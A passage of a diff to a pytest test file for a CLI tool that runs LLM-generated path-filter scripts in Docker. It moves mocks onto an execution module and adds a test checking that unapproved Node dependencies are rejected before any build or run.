+        patch.object(EXECUTION, "build_worker_image") as build,
+        patch.object(EXECUTION, "run_filter") as run_filter,
         patch.object(MODULE, "enumerate_paths", return_value=([container], {container: "a"})),
         pytest.raises(MODULE.DependencyError, match="sketchy-pkg"),
+    ):
+        MODULE.run_saved(script, str(tmp_path), whitelist=set())
+
+    build.assert_not_called()
+    run_filter.assert_not_called()
+
+
+def test_run_saved_gates_unapproved_node_dependencies(tmp_path):
+    code = "function filterPaths(paths){ return paths; }"
+    script = tmp_path / "f.cjs"
+    script.write_text(MODULE.serialize_filter(_gen_node(code, ["left-pad"]), "x", "gpt-4o-mini"))
+
+    container = "/data/a"
+    with (
+        patch.object(MODULE, "check_docker_available"),
+        patch.object(EXECUTION, "build_worker_image") as build,
+        patch.object(EXECUTION, "run_filter") as run_filter,
+        patch.object(MODULE, "enumerate_paths", return_value=([container], {container: "a"})),
+        pytest.raises(MODULE.DependencyError, match="left-pad"),
     ):
         MODULE.run_saved(script, str(tmp_path), whitelist=set())
 
@@ -1477,11 +1541,11 @@ def test_cli_save_writes_replayable_script(tmp_path):
     runner = CliRunner()
     with (
         patch.object(cli.backend, "check_docker_available"),
-        patch.object(cli.backend, "build_worker_image", return_value=cli.backend.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             cli.backend, "generate_filter", return_value=_gen("def filter_paths(paths): return []")
         ),
-        patch.object(cli.backend, "run_filter", return_value=[]),
+        patch.object(EXECUTION, "run_filter", return_value=[]),
     ):
         result = runner.invoke(cli.app, ["files", str(tmp_path), "--save", str(out)])
 
@@ -1498,13 +1562,13 @@ def test_cli_show_code_renders_full_saved_script(tmp_path):
     runner = CliRunner()
     with (
         patch.object(cli.backend, "check_docker_available"),
-        patch.object(cli.backend, "build_worker_image", return_value=cli.backend.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             cli.backend,
             "generate_filter",
             return_value=_gen("def filter_paths(paths): return []"),
         ),
-        patch.object(cli.backend, "run_filter", return_value=[]),
+        patch.object(EXECUTION, "run_filter", return_value=[]),
     ):
         result = runner.invoke(cli.app, ["epub files", str(tmp_path), "--show-code"])
 
